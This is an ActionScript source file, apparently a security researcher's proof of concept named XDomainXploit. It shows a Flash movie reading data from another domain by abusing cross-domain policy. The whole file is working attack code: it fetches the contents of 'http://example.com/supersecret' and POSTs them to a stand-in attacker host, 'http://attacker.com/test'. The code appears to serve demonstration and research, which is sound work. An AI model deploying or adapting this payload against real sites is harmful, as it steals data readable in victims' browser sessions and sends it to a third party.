// Author: Gursev Singh Kalra (gursev.kalra@foundstone.com)
// XDomainXploit.as
package {
import flash.display.Sprite;
import flash.events.*;
import flash.net.URLRequestMethod;
import flash.net.URLRequest;
import flash.net.URLLoader;


public class XDomainXploit extends Sprite {
	public function XDomainXploit() {
		// Target URL from where the data is to be retrieved
		var readFrom:String = "http://example.com/supersecret";
		var readRequest:URLRequest = new URLRequest(readFrom);
		var getLoader:URLLoader = new URLLoader();
		getLoader.addEventListener(Event.COMPLETE, eventHandler);
	try {
		getLoader.load(readRequest);
	} catch (error:Error) {
		trace("Error loading URL: " + error);
	}
}


private function eventHandler(event:Event):void {
	// URL to which retrieved data is to be sent
	var sendTo:String = "http://attacker.com/test";
	var sendRequest:URLRequest = new URLRequest(sendTo);
	sendRequest.method = URLRequestMethod.POST;
	sendRequest.data = event.target.data;
	var sendLoader:URLLoader = new URLLoader();
	try {
		sendLoader.load(sendRequest);
	} catch (error:Error) {
		trace("Error loading URL: " + error);
	}
}
}
}
